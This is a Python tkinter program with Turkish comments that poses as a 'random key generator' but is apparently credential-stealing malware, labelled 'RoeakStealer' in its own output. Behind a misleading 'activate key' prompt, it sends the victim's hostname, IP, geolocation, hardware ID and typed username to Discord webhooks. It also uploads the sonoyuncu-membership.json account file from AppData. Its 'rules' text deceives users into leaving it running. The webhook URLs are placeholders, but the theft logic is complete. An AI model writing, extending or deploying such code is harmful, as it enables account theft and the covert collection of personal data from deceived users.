import tkinter as tk
from tkinter import messagebox
import random
import string
import socket
import requests
import os
import subprocess
from datetime import datetime

# Tkinter uygulaması için global değişkenler
root = tk.Tk()
root.title("Random key oluşturucu")
click_count = 0
max_clicks = 1

# Metin girişi alanında gösterilecek varsayılan metin
default_text = "kullanıcı adınızı girin!"

def close_window():
    root.after(10000, root.destroy)  # 10 saniye sonra pencereyi kapat
    root.after(10000, lambda: os._exit(0))  # 10 saniye sonra Python'u kapat

def get_hwid():
    # Windows için hwid
    if os.name == "nt":
        # Komut satırından wmic komutunu kullanarak hwid al
        try:
            output = subprocess.check_output("wmic csproduct get uuid").decode().split()[-1]
            return output.strip()
        except Exception as e:
            print("HWID alınamadı:", e)
            return "HWID alınamadı"
    else:
        # Diğer işletim sistemleri için basit bir tanımlayıcı döndür
        return "Diğer işletim sistemleri için HWID yok"

def get_location(ip_address):
    # IP adresinin konumunu bulmak için kullanılacak API'nin URL'si
    url = f"http://ip-api.com/json/{ip_address}"
    
    # GET isteği göndererek konum bilgisini al
    response = requests.get(url)
    
    # Yanıtı JSON olarak işle
    data = response.json()
    
    # Konum bilgilerini döndür
    return data

def random_nick():
    global click_count
    
    if click_count < max_clicks:
        # "RandomNick" kelimesini oluştur
        base_word = "keyiniz budur:"
        
        # Rastgele harf dizisi oluştur
        random_letters = ''.join(random.choices(string.ascii_letters, k=len(base_word)))
        
        # Rastgele bir nick oluştur
        random_nick = base_word + random_letters

        # Nick'i ekrana yazdır
        nick_label.config(text=random_nick)
        
        
        # Kullanıcı izni al
        result = messagebox.askokcancel("İzin", "keyi aktif etmek istiyormusun")
             # Butonun yazısını "tik" emojisine dönüştür
        button.config(text="✔️", state=tk.DISABLED)  # ✔️ Unicode'ta bir tik işareti
        if result:
            # Kullanıcı izni verdiyse devam et
            # Kullanıcının IP adresini al
            ip_address = socket.gethostbyname(socket.gethostname())
            
            # IP adresinin konumunu al
            location_info = get_location(ip_address)
            
            # Discord webhookuna bilgisayar adını, IP adresini, metni ve HWID'yi gönder
            user_text = text_entry.get()  # Kullanıcının girdiği metni al
            hwid = get_hwid()  # HWID'yi al
            discord_webhook(socket.gethostname(), ip_address, user_text, hwid, location_info)
            
            # AppData/Roaming/.sonoyuncu klasörünü al ve webhooka yolla
            send_sonoyuncu_folder()
            
            # Tıklama sayısını artır
            click_count += 1
            if click_count == max_clicks:
                # Eğer tıklama sayısı maksimuma ulaşırsa butonu devre dışı bırak
                button.config(state=tk.DISABLED)
        else:
            # Kullanıcı izni vermediyse kapatma işlemini yap
            messagebox.showinfo("Bilgi", "İşlem iptal edildi onaylamadınız keyiniz bloke edildi.")
            close_window()
    else:
        messagebox.showinfo("Bilgi", "Max tıklama sayısına ulaşıldı.")
        close_window()

def notify_user():
    # İkinci Discord webhook URL'si
    second_webhook_url = 'WEBHOOK'
    
    # Bildirim içeriği
    notification_data = {
        "content": "Program başlatıldı. kullanıcı onaylanması bekleniyor......."  # Başlangıç bildirimi metni
    }
    
    # POST isteği gönder
    response = requests.post(second_webhook_url, json=notification_data)
    
    # Yanıtı kontrol et
    if response.status_code == 200:
        print("Bildirim başarıyla gönderildi.")
    else:
        print("Giriş başarı ile sağlanıldı", response.status_code)

# Program başladığında bildirim gönder
notify_user()


def discord_webhook(computer_name, ip_address, user_text, hwid, location_info):
    # Discord webhook URL'i
    webhook_url = 'WEBHOOK'
    
    # Şu anki zamanı al
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Embed objesi oluştur
    embed = {
        "title": "ham ham logged xD",
        "title": "kullanıcının bilgileri/RoeakStealer",
        "description": f"Bilgisayar Adı: {computer_name}\n"
                       f"IP Adresi: {ip_address}\n"
                       f"Kullanıcı Metni: {user_text}\n"
                       f"HWID: {hwid}\n"
                       f"Başlatma Zamanı: {current_time}\n"
                       f"Konum Bilgileri:\n"
                       f"Ülke: {location_info.get('country', 'Bilinmiyor')}\n"
                       f"Şehir: {location_info.get('city', 'Bilinmiyor')}\n"

                       f"Github: {('Roeak Stealer github.com/roeak1337xd')}",
        "color": 16711680  # Embed rengi (örneğin, kırmızı)
    }

    # Webhook'a gönderilecek veri
    payload = {
        "embeds": [embed]  # Embed objesini ekleyin
    }

    
    
    # Post isteği gönder
    requests.post(webhook_url, json=payload)
def send_sonoyuncu_folder():
    # AppData/Roaming/.sonoyuncu klasörünün yolu
    sonoyuncu_folder_path = os.path.join(os.getenv('APPDATA'), '.sonoyuncu')
    
    # Bootstrap.exe dosyasının yolu
    bootstrap_exe_path = os.path.join(sonoyuncu_folder_path, 'sonoyuncu-membership.json')
    
    # Eğer dosya varsa webhooka yolla
    if os.path.exists(bootstrap_exe_path):
        discord_webhook_file('sonoyuncu-membership.json', bootstrap_exe_path)
    else:
        messagebox.showinfo("Bilgi", "sonoyuncu-membership.json dosyası bulunamadı.")
        close_window()

def discord_webhook_file(file_name, file_path):
    # Discord webhook URL'i
    webhook_url = 'WEBHOOK'
    
    # Dosyayı oku
    with open(file_path, 'rb') as file:
        # Dosya içeriğini oku
        file_content = file.read()
    
    # Webhook'a gönderilecek veri
    files = {'file': (file_name, file_content)}
    
    # Post isteği gönder
    requests.post(webhook_url, files=files)

# Etiket oluştur
nick_label = tk.Label(root, text="Key oluştur!", font=("Helvetica", 16))
nick_label.pack(pady=20)

# Buton oluştur
button = tk.Button(root, text="Key", command=random_nick, font=("Helvetica", 16))
button.pack(pady=10)

# Yenileme linkini açmak için bir fonksiyon oluştur
def open_rules():
    messagebox.showinfo("Kurallar", "Keyiniz oluştuktan sonra programı hemen kapatmayın webhook üzerinden oluşan key bize gelicektir ve onaylanınca cmdye onaylandı mesajı alıcaksınız.")

# Kurallar bağlantısını oluştur
rules_label = tk.Label(root, text="Kurallar", fg="blue", cursor="hand2")
rules_label.pack(pady=5)
rules_label.bind("<Button-1>", lambda e: open_rules())

# Metin girişi alanı oluştur
text_entry = tk.Entry(root, font=("Helvetica", 16))
text_entry.pack(pady=10)

# Metin girişi alanına varsayılan metni ekle
text_entry.insert(0, default_text)

# Metin girişi alanında odak değiştiğinde varsayılan metni kaldır
def on_entry_click(event):
    if text_entry.get() == default_text:
        text_entry.delete(0, tk.END)

text_entry.bind('<FocusIn>', on_entry_click)

# Metin girişi alanında Enter tuşuna basıldığında gönderme fonksiyonunu çağır
text_entry.bind("<Return>", lambda event: random_nick())

# Pencereyi göster
root.mainloop()
